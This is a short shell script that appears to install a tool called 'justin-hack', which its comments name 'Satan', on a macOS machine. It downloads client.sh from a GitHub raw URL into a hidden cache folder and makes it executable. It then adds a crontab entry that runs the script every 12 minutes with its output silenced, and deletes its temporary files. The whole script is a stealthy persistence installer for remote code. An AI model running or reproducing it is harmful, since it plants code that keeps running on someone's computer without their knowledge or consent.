
jh=~/Library/Caches/jh

## Prepare field
mkdir $jh 2> /dev/null

## Get Satan
curl -o $jh/client.sh https://raw.githubusercontent.com/FredericMartinez/justin-hack/master/client.sh
chmod +x $jh/client.sh

## Backup buddies
crontab -l > $jh/crontab

## Add Sata to buddies
echo "*/12 * * * * $jh/client.sh > /dev/null 2>&1" >> $jh/crontab
crontab $jh/crontab

## Clean Satan
rm $jh/crontab
